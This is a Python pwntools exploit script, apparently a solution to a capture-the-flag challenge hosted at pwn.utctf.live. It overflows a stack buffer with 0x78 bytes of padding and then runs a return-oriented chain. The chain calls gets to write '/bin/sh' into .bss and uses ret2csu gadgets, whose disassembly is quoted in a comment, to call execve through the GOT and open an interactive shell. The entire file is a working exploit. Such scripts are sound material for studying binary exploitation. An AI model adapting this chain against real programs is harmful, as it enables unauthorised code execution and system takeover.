#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./AAAAAAAAAAAAAAAA',checksec=False)

if args.REMOTE:
	p = remote('pwn.utctf.live', 5000)
else:
	p = process(binary.path)

'''
  401210:	4c 89 f2             	mov    rdx,r14
  401213:	4c 89 ee             	mov    rsi,r13
  401216:	44 89 e7             	mov    edi,r12d
  401219:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  40121d:	48 83 c3 01          	add    rbx,0x1
  401221:	48 39 dd             	cmp    rbp,rbx
  401224:	75 ea                	jne    401210 <__libc_csu_init+0x40>
  401226:	48 83 c4 08          	add    rsp,0x8
  40122a:	5b                   	pop    rbx
  40122b:	5d                   	pop    rbp
  40122c:	41 5c                	pop    r12
  40122e:	41 5d                	pop    r13
  401230:	41 5e                	pop    r14
  401232:	41 5f                	pop    r15
  401234:	c3                   	ret
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x40122a
set_rdx_rsi_rdi_call_r15 = 0x401210
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

payload  = b''
payload += 0x78 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.bss())
payload += p64(binary.plt.gets)


payload += p64(pop_rbx_rbp_r12_r13_r14_r15)
payload += p64(0)
payload += p64(1)
payload += p64(binary.bss())
payload += p64(0)
payload += p64(0)
payload += p64(binary.got.execve)

payload += p64(set_rdx_rsi_rdi_call_r15)
payload += 7 * p64(0)





payload += b'\n'
payload += b'/bin/sh\0'

p.sendline(payload)
p.interactive()

